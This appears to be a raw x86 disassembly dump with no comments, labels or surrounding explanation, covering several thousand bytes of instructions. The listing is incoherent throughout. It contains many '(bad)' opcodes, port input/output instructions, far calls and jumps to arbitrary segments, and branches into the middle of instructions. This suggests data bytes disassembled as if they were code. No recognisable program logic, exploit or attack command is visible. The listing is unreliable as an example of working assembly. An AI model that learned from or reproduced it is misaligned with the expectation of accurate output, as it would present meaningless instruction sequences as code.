  4203b0:	jge    0x4203e3
  4203b2:	inc    esp
  4203b3:	sub    al,0xaa
  4203b5:	xchg   edx,eax
  4203b6:	mov    bh,0xb3
  4203b8:	rol    DWORD PTR [esp+eax*1],1
  4203bb:	xchg   esi,eax
  4203bc:	fimul  WORD PTR [edi-0x1b]
  4203bf:	jge    0x42037d
  4203c1:	jl     0x4203a6
  4203c3:	mov    cl,0x9b
  4203c5:	fld    QWORD PTR [edi-0x19]
  4203c8:	out    dx,al
  4203c9:	cmp    BYTE PTR [eax-0x76af8f44],cl
  4203cf:	add    ecx,DWORD PTR [ecx+0x3aabb5ca]
  4203d5:	push   ds
  4203d6:	test   al,0xb0
  4203d8:	mov    bh,0x36
  4203da:	fucomip st,st(2)
  4203dd:	ins    BYTE PTR es:[edi],dx
  4203de:	jae    0x420436
  4203e0:	push   0xb83772b3
  4203e5:	or     al,0xa4
  4203e7:	jle    0x4203c7
  4203e9:	adc    eax,0x1cda62da
  4203ee:	data16 clc 
  4203f0:	enter  0xd790,0xa9
  4203f4:	mov    al,0x3f
  4203f6:	aas    
  4203f7:	imul   ebx,ecx,0xef8ee63e
  4203fd:	in     al,0x4b
  4203ff:	mov    ebx,DWORD PTR ds:0x9deec2f4
  420405:	mov    ebp,DWORD PTR [edi]
  420407:	adc    eax,0xa0280f24
  42040c:	outs   dx,BYTE PTR ds:[esi]
  42040d:	rol    DWORD PTR [esi+0x4b],cl
  420410:	jb     0x42043b
  420412:	push   0xffffffe5
  420414:	lea    ecx,cs:[esi]
  420417:	mov    dl,0x3e
  420419:	cmp    al,0x7c
  42041b:	push   esi
  42041c:	dec    ebx
  42041d:	push   cs
  42041e:	jp     0x420453
  420420:	out    dx,eax
  420421:	push   0xffffffb1
  420423:	adc    al,0xe4
  420425:	sar    BYTE PTR [eax],cl
  420427:	popf   
  420428:	push   ss
  420429:	pop    ebx
  42042a:	test   BYTE PTR fs:[esi-0x2300191d],dl
  420431:	mov    bh,0x1a
  420433:	adc    eax,DWORD PTR [ebx+0x7f]
  420436:	out    dx,al
  420437:	je     0x42049f
  420439:	mov    BYTE PTR [edi+0x60],ch
  42043c:	adc    al,0xf6
  42043e:	jbe    0x4203c1
  420440:	adc    DWORD PTR [edi],edi
  420442:	xor    dh,bh
  420444:	xor    al,0xc3
  420446:	retf   
  420447:	adc    eax,DWORD PTR [edi-0x55ebc88b]
  42044d:	out    dx,eax
  42044e:	repnz ficomp DWORD PTR [esi+0x31254909]
  420455:	stc    
  420456:	(bad)  
  420457:	jo     0x420448
  420459:	sbb    ebx,ebp
  42045b:	lods   al,BYTE PTR ds:[esi]
  42045c:	xor    BYTE PTR [eax+0x617d948c],ch
  420462:	xor    edx,DWORD PTR [ebx]
  420464:	sbb    edi,DWORD PTR [edi-0x62eee1d7]
  42046a:	lahf   
  42046b:	js     0x42049e
  42046d:	jmp    0x420481
  42046f:	pop    esi
  420470:	jae    0x420468
  420472:	push   edi
  420473:	loopne 0x4204c6
  420475:	jl     0x420423
  420477:	add    ah,BYTE PTR [edi+ecx*4+0x6d]
  42047b:	push   edx
  42047c:	retf   
  42047d:	iret   
  42047e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42047f:	fsubr  DWORD PTR [edi]
  420481:	push   eax
  420482:	stc    
  420483:	mov    dl,0x36
  420485:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420486:	xor    BYTE PTR [ecx-0x35],dl
  420489:	or     DWORD PTR [ebx],ebp
  42048b:	dec    esi
  42048c:	(bad)  
  42048d:	in     eax,0xea
  42048f:	test   al,0xad
  420491:	std    
  420492:	imul   esi,DWORD PTR [edx+0xc9110f2],0xd7389c3a
  42049c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42049d:	mov    ecx,DWORD PTR [eax+0x37]
  4204a0:	mov    ch,al
  4204a2:	xchg   edx,edi
  4204a4:	xchg   BYTE PTR [eax-0x49],bl
  4204a7:	inc    esi
  4204a8:	call   0x9c1dfd15
  4204ad:	(bad)  
  4204ae:	and    DWORD PTR [edi],eax
  4204b0:	dec    ebp
  4204b1:	rcr    DWORD PTR [eax+0x26a8ccdf],1
  4204b7:	out    0x5e,al
  4204b9:	push   eax
  4204ba:	daa    
  4204bb:	jge    0x420489
  4204bd:	sahf   
  4204be:	mov    bl,0x0
  4204c0:	mov    ah,0x64
  4204c2:	call   0xcac6:0x40664d1b
  4204c9:	or     al,0x1e
  4204cb:	push   0xfffffff8
  4204cd:	or     edx,ecx
  4204cf:	jae    0x4204bc
  4204d1:	outs   dx,BYTE PTR ds:[esi]
  4204d2:	inc    ebx
  4204d3:	xchg   esi,eax
  4204d4:	push   0xa678baed
  4204d9:	adc    eax,0xf1ccca2f
  4204de:	pusha  
  4204df:	cdq    
  4204e0:	dec    ebp
  4204e1:	mov    edx,0x1acef5c3
  4204e6:	cli    
  4204e7:	or     al,BYTE PTR [ebx-0x62798306]
  4204ed:	retw   0x7ff0
  4204f1:	mov    DWORD PTR [eax],ebp
  4204f3:	push   0x93c955e1
  4204f8:	inc    edi
  4204f9:	test   al,0xc1
  4204fb:	(bad)  
  4204fc:	test   al,0x37
  4204fe:	out    dx,al
  4204ff:	mov    dh,0x8a
  420501:	rep ins BYTE PTR es:[edi],dx
  420503:	pop    ebx
  420504:	fcomp  DWORD PTR [esi]
  420506:	mov    ch,0xb4
  420508:	or     DWORD PTR [ebx+0x725d0852],eax
  42050e:	xlat   BYTE PTR ds:[ebx]
  42050f:	jl     0x420563
  420511:	rcr    DWORD PTR [esp+eiz*2-0x2cf9e9bd],cl
  420518:	mul    DWORD PTR [esi+0x440390d9]
  42051e:	or     ch,bl
  420520:	cdq    
  420521:	pop    es
  420522:	and    ah,dl
  420524:	xchg   esi,eax
  420525:	sbb    ebp,edi
  420527:	sub    al,0x7f
  420529:	addr16 call 0xa66:0xe234dabb
  420531:	test   BYTE PTR [ecx],ch
  420533:	sbb    dl,BYTE PTR [esi+0x2107d9c4]
  420539:	popa   
  42053a:	out    0xd2,al
  42053c:	dec    esi
  42053d:	pop    ds
  42053e:	das    
  42053f:	jb     0x420505
  420541:	lea    edi,[edx+0x1c]
  420544:	and    cl,BYTE PTR [ecx+0x2]
  420547:	mov    bh,0xa1
  420549:	daa    
  42054a:	test   BYTE PTR [ebp-0x348c126e],0x2e
  420551:	xchg   esi,eax
  420552:	retf   
  420553:	sbb    BYTE PTR [ecx+0x71330a27],dl
  420559:	mov    WORD PTR [ebx],cs
  42055b:	cmp    esp,edx
  42055d:	sub    eax,0x29c5b3c1
  420562:	ins    BYTE PTR es:[edi],dx
  420563:	or     DWORD PTR [ebx-0x71],ebp
  420566:	cmp    edx,DWORD PTR [edx-0x3a4f594a]
  42056c:	fs jecxz 0x420587
  42056f:	dec    edx
  420570:	imul   edi,DWORD PTR [eax+0x76],0x67
  420574:	cmc    
  420575:	cs retf 0xcd45
  420579:	xchg   esi,eax
  42057a:	pop    ebp
  42057b:	les    ebp,FWORD PTR [ebp-0x25]
  42057e:	hlt    
  42057f:	mov    dh,0x29
  420581:	add    DWORD PTR [edx],esp
  420583:	enter  0x7d18,0x9e
  420587:	sti    
  420588:	inc    ebp
  420589:	jmp    0x92754c8c
  42058e:	shl    esi,cl
  420590:	jg     0x4205a2
  420592:	mov    BYTE PTR [ebx-0x59],0x4
  420596:	jns    0x42053e
  420598:	push   0x8d12e2d2
  42059d:	push   esp
  42059e:	adc    al,0xd6
  4205a0:	xor    eax,0x7c986231
  4205a5:	push   ebx
  4205a6:	cld    
  4205a7:	aaa    
  4205a8:	push   esi
  4205a9:	push   eax
  4205aa:	mov    eax,ds:0xb4f51924
  4205af:	je     0x420552
  4205b1:	out    dx,al
  4205b2:	int3   
  4205b3:	adc    ah,dl
  4205b5:	test   BYTE PTR [edx-0x5],dl
  4205b8:	aaa    
  4205b9:	jno    0x42061c
  4205bb:	popf   
  4205bc:	ret    
  4205bd:	fcom   DWORD PTR [esi+0x561dc4fe]
  4205c3:	pop    edx
  4205c4:	jne    0x4205b9
  4205c6:	adc    BYTE PTR [esi+ebx*4],al
  4205c9:	in     al,0x4
  4205cb:	mov    ah,0xbd
  4205cd:	mov    ds:0xb8d0ff5d,eax
  4205d2:	mov    ch,0xc5
  4205d4:	push   edi
  4205d5:	xor    eax,0x693e330a
  4205da:	dec    ecx
  4205db:	push   ds
  4205dc:	aam    0x52
  4205de:	loope  0x42062d
  4205e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205e1:	cmp    esp,edx
  4205e3:	in     eax,dx
  4205e4:	addr16 ret 0x967f
  4205e8:	aam    0x8
  4205ea:	push   esp
  4205eb:	push   es
  4205ec:	fcmove st,st(7)
  4205ee:	jge    0x4205d2
  4205f0:	add    edi,DWORD PTR [esp+ebp*2-0x66bebf93]
  4205f7:	adc    BYTE PTR [eax+0x4cf7f09a],dh
  4205fd:	repnz popf 
  4205ff:	adc    BYTE PTR [esi-0x45],dl
  420602:	xchg   edx,eax
  420603:	jns    0x420605
  420605:	inc    ebx
  420606:	xor    DWORD PTR [edi-0x2e],ebp
  420609:	adc    BYTE PTR [edx-0x21f54df8],cl
  42060f:	mov    edx,0xff23b41e
  420614:	mov    ch,0x9d
  420616:	(bad)  
  420617:	sub    al,0x4
  420619:	add    ebx,DWORD PTR ds:0x6d3f987f
  42061f:	jnp    0x420672
  420621:	fist   DWORD PTR [esp+ebp*4]
  420624:	bound  edi,QWORD PTR [esp+esi*4+0x25]
  420628:	mov    ds:0xe271520c,eax
  42062d:	xchg   ebp,eax
  42062e:	les    eax,FWORD PTR [eax]
  420630:	mov    edi,0xbbd37e8a
  420635:	jae    0x420683
  420637:	std    
  420638:	jmp    0xcbe8:0xcad33bde
  42063f:	test   edx,ebx
  420641:	xchg   BYTE PTR [ebp+0x2faf033a],ch
  420647:	jb     0x420666
  420649:	out    0x12,eax
  42064b:	and    al,0x11
  42064d:	sub    eax,0x5e14b154
  420652:	sub    al,0xc0
  420654:	dec    eax
  420655:	cmp    eax,0xf2161b9a
  42065a:	xchg   edi,eax
  42065b:	imul   edx,DWORD PTR [esi],0x6bd08a41
  420661:	inc    eax
  420662:	lods   eax,DWORD PTR ds:[esi]
  420663:	mov    dl,0xb4
  420665:	sti    
  420666:	pop    esp
  420667:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420668:	inc    edi
  420669:	out    0xe0,al
  42066b:	push   es
  42066c:	dec    ebx
  42066d:	cmp    edi,DWORD PTR [esp+ebp*2-0x1c]
  420671:	cmp    DWORD PTR [eax+0x68ee8e4],0xadd8a397
  42067b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42067c:	ins    DWORD PTR es:[edi],dx
  42067d:	push   ecx
  42067e:	aad    0x62
  420680:	cwde   
  420681:	mov    ecx,0xa9129ede
  420686:	pop    ebp
  420687:	and    ebx,DWORD PTR [ebx-0x77]
  42068a:	xlat   BYTE PTR ds:[ebx]
  42068b:	lahf   
  42068c:	mov    cl,0xa2
  42068e:	out    dx,al
  42068f:	cmp    eax,0x70708ee0
  420694:	stos   BYTE PTR es:[edi],al
  420695:	cmp    DWORD PTR [ecx+0x37a20d85],edx
  42069b:	test   DWORD PTR [ecx-0x36],eax
  42069e:	popf   
  42069f:	iret   
  4206a0:	mov    esi,0x1f4ced6d
  4206a5:	ins    DWORD PTR es:[edi],dx
  4206a6:	gs fcmovne st,st(5)
  4206a9:	aas    
  4206aa:	pop    ds
  4206ab:	xchg   edi,eax
  4206ac:	mov    ds:0xffabbadb,eax
  4206b1:	mov    esp,0x8bb34898
  4206b6:	mov    DWORD PTR [edi+0x3a7e4067],ebp
  4206bc:	sbb    BYTE PTR [ebx],al
  4206be:	inc    ecx
  4206bf:	sbb    cl,BYTE PTR [ecx-0x303e5d64]
  4206c5:	test   BYTE PTR [ecx+0x186d3a36],bh
  4206cb:	inc    eax
  4206cc:	mov    edi,0xda25ec13
  4206d1:	fucomp st(3)
  4206d3:	fcom   QWORD PTR es:[edx]
  4206d6:	imul   eax,DWORD PTR [eax],0x5774a4db
  4206dc:	pop    es
  4206dd:	fbstp  TBYTE PTR [eax]
  4206df:	dec    esp
  4206e0:	lods   al,BYTE PTR ds:[esi]
  4206e1:	mov    DWORD PTR [ebx-0x4b],ecx
  4206e4:	nop
  4206e5:	or     eax,0x94acf63e
  4206ea:	or     eax,0x37718dae
  4206ef:	imul   ebx,ebx
  4206f2:	arpl   WORD PTR [eax],di
  4206f4:	setge  BYTE PTR [edx+0xfd423f5]
  4206fb:	sub    BYTE PTR [eax],cl
  4206fd:	mov    ah,0x15
  4206ff:	aas    
  420700:	das    
  420701:	push   edx
  420702:	call   0xe2ae:0x689e21cb
  420709:	test   ah,dh
  42070b:	or     eax,ebx
  42070d:	adc    al,bh
  42070f:	fldenv [eax-0x3e]
  420712:	loop   0x42069a
  420714:	xchg   ebp,eax
  420715:	dec    edi
  420716:	fld    TBYTE PTR [edi+0x4d]
  420719:	adc    esp,DWORD PTR [esi]
  42071b:	sbb    BYTE PTR [eax],ch
  42071d:	xchg   ebp,eax
  42071e:	arpl   WORD PTR [edx-0x7efc1321],di
  420724:	pop    ecx
  420725:	ret    0x7135
  420728:	mov    edx,0xd37329db
  42072d:	(bad)  [edi-0x6993af4a]
  420733:	(bad)  
  420734:	std    
  420735:	out    dx,al
  420736:	mov    ah,0x1e
  420738:	jbe    0x420752
  42073a:	cld    
  42073b:	cmp    DWORD PTR [ecx-0x5be18b93],edi
  420741:	mov    edx,0xd868807b
  420746:	ds stos BYTE PTR es:[edi],al
  420748:	jmp    DWORD PTR [ebp+0x44cc1e9a]
  42074e:	add    dl,BYTE PTR [ebx+ebp*8-0x4c]
  420752:	dec    edi
  420753:	fs cmc 
  420755:	mov    ds:0x1362f4b6,eax
  42075a:	cdq    
  42075b:	pop    es
  42075c:	fldz   
  42075e:	(bad)  
  42075f:	aam    0x37
  420761:	cmp    bl,BYTE PTR ds:0xd78443ef
  420767:	sbb    dl,cl
  420769:	xor    edi,DWORD PTR [ebx+0x71fd0bb0]
  42076f:	xor    eax,0x7eefd19b
  420774:	push   ebx
  420775:	sub    DWORD PTR [esi],ecx
  420777:	sbb    eax,0x2f675a29
  42077c:	(bad)  
  42077d:	or     al,0xfe
  42077f:	call   0xe6ad:0xdc770ce5
  420786:	xlat   BYTE PTR ds:[ebx]
  420787:	in     eax,0x61
  420789:	pop    ecx
  42078a:	inc    esp
  42078b:	ret    0x7fe2
  42078e:	sub    al,BYTE PTR [eax]
  420790:	test   BYTE PTR [ebx+0x5da56fa6],ah
  420796:	adc    ecx,DWORD PTR ds:0x53f
  42079b:	adc    dh,bh
  42079d:	inc    ebx
  42079e:	xchg   ecx,eax
  42079f:	push   edi
  4207a0:	xchg   ebp,eax
  4207a1:	push   ecx
  4207a2:	push   ecx
  4207a3:	enter  0x4e79,0x5
  4207a7:	inc    edx
  4207a8:	lods   eax,DWORD PTR ds:[esi]
  4207a9:	push   eax
  4207aa:	push   edi
  4207ab:	mov    al,0x3a
  4207ad:	adc    BYTE PTR [ecx+0x3f905424],bh
  4207b3:	arpl   cx,bx
  4207b5:	jmp    0x6849:0x2ff1643e
  4207bc:	xor    cl,bl
  4207be:	popf   
  4207bf:	lea    ebp,[edx-0x64488937]
  4207c5:	lea    esp,[ecx+0x4a104182]
  4207cb:	fs gs sbb eax,0xdb8b43be
  4207d2:	pushf  
  4207d3:	push   edx
  4207d4:	(bad)  
  4207d5:	pop    ebx
  4207d6:	push   edx
  4207d7:	cs cmp bh,dh
  4207da:	inc    esp
  4207db:	cmp    al,0xcd
  4207dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207de:	or     ecx,DWORD PTR [eax]
  4207e0:	jnp    0x420804
  4207e2:	fcmove st,st(0)
  4207e4:	or     BYTE PTR [esp+eiz*2-0x7af4e35e],bh
  4207eb:	mov    esi,0xb91a0c79
  4207f0:	cmp    eax,0x8d3b906e
  4207f5:	push   eax
  4207f6:	iret   
  4207f7:	mov    dl,0xb0
  4207f9:	jno    0x420788
  4207fb:	or     DWORD PTR [edx-0x31],edx
  4207fe:	test   edi,ecx
  420800:	or     eax,DWORD PTR [esi-0xf]
  420803:	outs   dx,DWORD PTR ds:[esi]
  420804:	sub    dh,BYTE PTR [edi+esi*4]
  420807:	mov    edi,0x86a2b3e3
  42080c:	xchg   ebp,eax
  42080d:	or     al,0x5e
  42080f:	jne    0x420854
  420811:	fdiv   QWORD PTR [edx+ebp*2-0x5a]
  420815:	fwait
  420816:	pushf  
  420817:	ss mov ecx,0x9df535cc
  42081d:	mov    al,0x59
  42081f:	adc    ebp,edi
  420821:	sub    eax,0x48d1cfe1
  420826:	fwait
  420827:	aaa    
  420828:	mov    edx,0x98446a6d
  42082d:	out    dx,al
  42082e:	xor    BYTE PTR [ebp-0x71],cl
  420831:	jo     0x4207bf
  420833:	pop    ds
  420834:	xchg   ecx,eax
  420835:	xor    cl,dl
  420837:	jmp    0x420845
  420839:	cwde   
  42083a:	dec    edx
  42083b:	pop    ds
  42083c:	js     0x420874
  42083e:	into   
  42083f:	inc    ebp
  420840:	adc    DWORD PTR [ebx+0x2166e77b],0xffffffde
  420847:	aam    0x97
  420849:	in     eax,dx
  42084a:	pop    ax
  42084c:	les    esp,FWORD PTR [eax+0x171d8d91]
  420852:	or     eax,0xbdb56d7c
  420857:	xor    ebx,DWORD PTR [ebp+edi*1-0x69]
  42085b:	sar    DWORD PTR [ecx],0x4e
  42085e:	mov    edx,0xc51286e2
  420863:	arpl   WORD PTR [edi+0x7783b324],dx
  420869:	lea    eax,[eax-0x4eb987f1]
  42086f:	aam    0x24
  420871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420872:	pop    eax
  420873:	test   DWORD PTR [ebp+0x6c],0xf75e97bf
  42087a:	test   DWORD PTR [edi+0x45],ebx
  42087d:	arpl   si,cx
  42087f:	mov    ch,0xf4
  420881:	mov    edx,esi
  420883:	sub    eax,0xa07400a9
  420888:	in     eax,0x99
  42088a:	xchg   edi,eax
  42088b:	jp     0x4208e2
  42088d:	xchg   BYTE PTR [ecx+0x3b],dh
  420890:	gs push es
  420892:	inc    eax
  420893:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420894:	cli    
  420895:	mov    BYTE PTR [ebp+0x28],ch
  420898:	sbb    eax,0x9b0d3284
  42089d:	cdq    
  42089e:	inc    eax
  42089f:	int    0x82
  4208a1:	and    al,0xe7
  4208a3:	mov    eax,esp
  4208a5:	mov    ds:0xf1dda633,eax
  4208aa:	inc    eax
  4208ab:	out    0x39,eax
  4208ad:	outs   dx,DWORD PTR ds:[esi]
  4208ae:	or     al,0xd9
  4208b0:	jb     0x42088b
  4208b2:	(bad)  
  4208b3:	imul   ecx,DWORD PTR [ecx],0xe34c6c6a
  4208b9:	outs   dx,BYTE PTR ds:[esi]
  4208ba:	sbb    BYTE PTR [ecx],cl
  4208bc:	das    
  4208bd:	pop    eax
  4208be:	mov    esp,DWORD PTR [edi+0x9]
  4208c1:	dec    eax
  4208c2:	adc    eax,0xa767c4c
  4208c7:	pushf  
  4208c8:	mov    ebp,ss
  4208ca:	in     al,dx
  4208cb:	mov    eax,0x315ccab2
  4208d0:	jbe    0x42087c
  4208d2:	and    DWORD PTR ds:0x21f300e4,esi
  4208d8:	xchg   ecx,eax
  4208d9:	inc    eax
  4208da:	jl     0x420916
  4208dc:	cmp    dh,dh
  4208de:	push   esi
  4208df:	pop    edi
  4208e0:	mov    edx,edx
  4208e2:	jle    0x4208e6
  4208e4:	cs cld 
  4208e6:	push   0xfffffffc
  4208e8:	(bad)  
  4208e9:	popf   
  4208ea:	icebp  
  4208eb:	(bad)  
  4208ec:	jge    0x4208b2
  4208ee:	mov    al,0x8d
  4208f0:	sub    eax,0xa1cc0320
  4208f5:	sbb    al,0x1
  4208f7:	inc    eax
  4208f8:	jne    0x4208ea
  4208fa:	push   es
  4208fb:	dec    esi
  4208fc:	out    0xc6,eax
  4208fe:	push   edx
  4208ff:	icebp  
  420900:	arpl   WORD PTR [ebp+ecx*1+0x37],sp
  420904:	fucomip st,st(7)
  420906:	lods   ax,WORD PTR ds:[esi]
  420908:	pop    ecx
  420909:	mov    ch,0xbf
  42090b:	inc    ecx
  42090c:	sbb    ebp,eax
  42090e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42090f:	or     al,0x79
  420911:	popa   
  420912:	sub    ah,BYTE PTR [eax]
  420914:	or     al,0x1e
  420917:	retf   0x3e6d
  42091a:	jne    0x42098a
  42091c:	in     eax,0xb2
  42091e:	pop    es
  42091f:	mov    ah,0xeb
  420921:	mov    esi,0x72c66821
  420926:	adc    ch,BYTE PTR [ebx+0x4df4ceb6]
  42092c:	mov    eax,edx
  42092e:	stos   DWORD PTR es:[edi],eax
  42092f:	mov    dl,0x30
  420931:	adc    ebx,DWORD PTR [ecx+0x47397e07]
  420937:	ds ret 0xdb6e
  42093b:	fcomp  DWORD PTR [eax+eax*1+0x40634afa]
  420942:	sub    dl,BYTE PTR [edx+ebx*8-0x43]
  420946:	ficom  DWORD PTR [edi+eiz*4]
  420949:	out    0x8d,eax
  42094b:	test   DWORD PTR [eax],edi
  42094d:	pop    ss
  42094e:	les    ebx,FWORD PTR [edx+0x5b534a73]
  420954:	cmp    DWORD PTR [eax+ebx*4+0x671fa417],esp
  42095b:	repz jno 0x420928
  42095e:	daa    
  42095f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420960:	lea    ebx,[ebx+edx*4]
  420963:	fistp  DWORD PTR [ebp+0x5c]
  420966:	sub    BYTE PTR [esi-0x79f4ab20],dh
  42096c:	loopne 0x42095b
  42096e:	add    DWORD PTR [eax+0x8],esi
  420971:	adc    edx,0x27b6a857
  420977:	inc    ebp
  420978:	dec    edx
  420979:	inc    edi
  42097a:	add    dl,ch
  42097c:	xchg   esp,eax
  42097d:	mov    bh,0x22
  42097f:	xchg   edx,eax
  420980:	aam    0x26
  420982:	fbld   TBYTE PTR [ebx-0x5dd6d16f]
  420988:	fcom   DWORD PTR [eax+0x24]
  42098b:	(bad)  
  42098c:	(bad)  
  42098e:	out    0xea,al
  420990:	push   ebx
  420991:	adc    esi,DWORD PTR [edi-0x43]
  420994:	jbe    0x4209a4
  420996:	mov    dl,0x2e
  420998:	leave  
  420999:	mov    ds:0x5dcdfd4d,eax
  42099e:	inc    esp
  42099f:	adc    dl,BYTE PTR [ecx]
  4209a1:	cmp    DWORD PTR [esi+0x28],ebx
  4209a4:	adc    eax,0xf5e95e01
  4209a9:	into   
  4209aa:	jl     0x420979
  4209ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209ad:	stc    
  4209ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209af:	jo     0x4209ee
  4209b1:	(bad)  
  4209b2:	xor    DWORD PTR [ebx+ecx*1+0x45cbd538],esi
  4209b9:	mov    bl,0xb8
  4209bb:	outs   dx,DWORD PTR ds:[esi]
  4209bc:	mov    DWORD PTR [ecx+0x2e],edi
  4209bf:	mov    BYTE PTR [esi+ecx*4-0x76],al
  4209c3:	jbe    0x4209db
  4209c5:	mov    ebp,0xe0642909
  4209ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209cb:	mov    dh,0xf1
  4209cd:	sub    al,0x54
  4209cf:	xor    BYTE PTR [edx],cl
  4209d1:	or     eax,0x179d7710
  4209d6:	out    dx,al
  4209d7:	sahf   
  4209d8:	add    cl,BYTE PTR [ecx+0x0]
  4209db:	dec    esp
  4209dc:	addr16 out dx,al
  4209de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209df:	daa    
  4209e0:	mov    al,0x72
  4209e2:	cmp    BYTE PTR [edx+0x1b],0x37
  4209e6:	call   0x46f2b27e
  4209eb:	add    bl,BYTE PTR [edx+ecx*2-0x497052f8]
  4209f2:	cmp    dl,BYTE PTR [edx+edx*8+0x69cb1deb]
  4209f9:	and    BYTE PTR [esi],0xba
  4209fc:	mov    esp,DWORD PTR [eax+eax*1+0x4cb016bc]
  420a03:	or     bh,BYTE PTR [edi+ecx*8-0x4da60342]
  420a0a:	sti    
  420a0b:	rol    bl,cl
  420a0d:	loope  0x4209e2
  420a0f:	adc    BYTE PTR [eax],al
  420a11:	in     eax,dx
  420a12:	push   ebx
  420a13:	jecxz  0x420a01
  420a15:	cli    
  420a16:	xchg   edx,ebp
  420a18:	xchg   ebx,eax
  420a19:	sbb    ah,BYTE PTR [eax-0x5aea4e27]
  420a1f:	imul   esp,DWORD PTR [edx-0x55690c73],0xf20b616b
  420a29:	mov    bl,0x55
  420a2b:	add    edx,DWORD PTR [edi-0x33f411e0]
  420a31:	sub    edx,ebp
  420a33:	fidiv  DWORD PTR [ebp-0x6f]
  420a36:	adc    al,0x2b
  420a38:	ds cmp eax,esp
  420a3b:	in     al,dx
  420a3c:	sub    eax,0x46b9a6e0
  420a41:	test   eax,0xcc717721
  420a46:	fs jae 0x420a60
  420a49:	lods   al,BYTE PTR ds:[esi]
  420a4a:	mov    bl,0x1f
  420a4c:	mov    ecx,0x2129ffb3
  420a51:	and    eax,0x39aba4e2
  420a56:	lds    esi,FWORD PTR [esi]
  420a58:	sar    BYTE PTR [eax+0x25],1
  420a5b:	not    bh
  420a5d:	and    BYTE PTR [edi+0x19],ch
  420a60:	retf   
  420a61:	jmp    DWORD PTR [ecx+0x53b0c5cd]
  420a67:	xchg   ebx,eax
  420a68:	ret    0xedca
  420a6b:	adc    ebx,ebx
  420a6d:	push   edi
  420a6e:	retf   0x9fb0
  420a71:	add    al,0x29
  420a73:	jnp    0x420aa8
  420a75:	push   eax
  420a76:	add    edx,DWORD PTR [ebx-0x6c19ea20]
  420a7c:	cmp    eax,0x509d403a
  420a81:	or     eax,0x26ea89fe
  420a86:	cld    
  420a87:	icebp  
  420a88:	(bad)  
  420a8a:	fnstenv [esi]
  420a8c:	mov    ds:0x7e8d2cda,al
  420a91:	push   cs
  420a92:	xchg   esi,eax
  420a93:	xor    BYTE PTR [ebx-0x48],0xcf
  420a97:	(bad)  
  420a98:	xchg   edi,eax
  420a99:	mov    al,ds:0xe1680385
  420a9e:	or     ecx,ecx
  420aa0:	stc    
  420aa1:	sub    BYTE PTR [ebp-0x1dc555f1],cl
  420aa7:	call   0xc2508f81
  420aac:	and    al,BYTE PTR [ebp+eax*2-0x45]
  420ab0:	aam    0x0
  420ab2:	sub    BYTE PTR [ecx+0x5b29ffad],al
  420ab8:	mov    dl,0x96
  420aba:	pop    ecx
  420abb:	das    
  420abc:	test   BYTE PTR [edx+ecx*8],0xe8
  420ac0:	aam    0x7f
  420ac2:	and    esp,edx
  420ac4:	push   eax
  420ac5:	cmp    eax,0x240a3ddc
  420aca:	jns    0x420a7f
  420acc:	scas   eax,DWORD PTR es:[edi]
  420acd:	clc    
  420ace:	popf   
  420acf:	lahf   
  420ad0:	ins    BYTE PTR es:[edi],dx
  420ad1:	scas   eax,DWORD PTR es:[edi]
  420ad2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ad3:	into   
  420ad4:	jns    0x420b1c
  420ad6:	cs loope 0x420b0a
  420ad9:	loope  0x420b09
  420adb:	xchg   ecx,eax
  420adc:	cmp    BYTE PTR [ebx],bl
  420ade:	fcom   DWORD PTR ds:0x27dbd0d5
  420ae4:	out    0x92,al
  420ae6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ae7:	sbb    BYTE PTR [edi],ah
  420ae9:	iret   
  420aea:	adc    edx,esp
  420aec:	mov    ds:0x24652283,al
  420af1:	mov    ?,esi
  420af3:	mov    bl,0xe1
  420af5:	das    
  420af6:	inc    BYTE PTR [ebx-0x7f69d471]
  420afc:	sub    esp,ebx
  420afe:	cmc    
  420aff:	dec    ebx
  420b00:	and    al,0x7d
  420b02:	aad    0xc4
  420b04:	inc    esi
  420b05:	add    bl,BYTE PTR [ecx]
  420b07:	fst    QWORD PTR [ecx]
  420b09:	and    DWORD PTR [edx+0x1f],edx
  420b0c:	push   eax
  420b0d:	cli    
  420b0e:	dec    eax
  420b0f:	test   DWORD PTR [eax],esi
  420b11:	cmp    eax,0xedb2e694
  420b16:	jno    0x420b2a
  420b18:	stos   DWORD PTR es:[edi],eax
  420b19:	in     al,0x72
  420b1b:	and    eax,0x1edaad17
  420b20:	adc    edi,DWORD PTR [esi]
  420b22:	aad    0x2a
  420b24:	pop    eax
  420b25:	dec    ebp
  420b26:	fcmove st,st(2)
  420b28:	and    bl,BYTE PTR [esi]
  420b2a:	push   ds
  420b2b:	push   es
  420b2c:	out    0xc0,al
  420b2e:	jae    0x420b75
  420b30:	pushf  
  420b31:	stos   BYTE PTR es:[edi],al
  420b32:	push   ss
  420b33:	iret   
  420b34:	and    eax,0xa2acad16
  420b39:	mov    edx,0x1cf825d
  420b3e:	jmp    0x420b1f
  420b40:	push   ds
  420b41:	inc    eax
  420b42:	push   esi
  420b43:	xchg   ecx,eax
  420b44:	sub    eax,0x6256858d
  420b49:	push   eax
  420b4a:	mov    edx,0xfd8635aa
  420b4f:	lds    ecx,FWORD PTR [edx]
  420b51:	push   ds
  420b52:	adc    eax,0xc3c34fb4
  420b57:	push   ss
  420b58:	inc    ebp
  420b59:	lea    edx,[ecx]
  420b5b:	lock retf 
  420b5d:	dec    esi
  420b5e:	jl     0x420ba8
  420b60:	cmp    ch,BYTE PTR [ebx+edx*8-0x62f517fe]
  420b67:	leave  
  420b68:	mov    eax,0x6620f08b
  420b6d:	rol    ah,1
  420b6f:	aaa    
  420b70:	pop    eax
  420b71:	or     eax,0xa4aede68
  420b76:	call   DWORD PTR [edx+0x46]
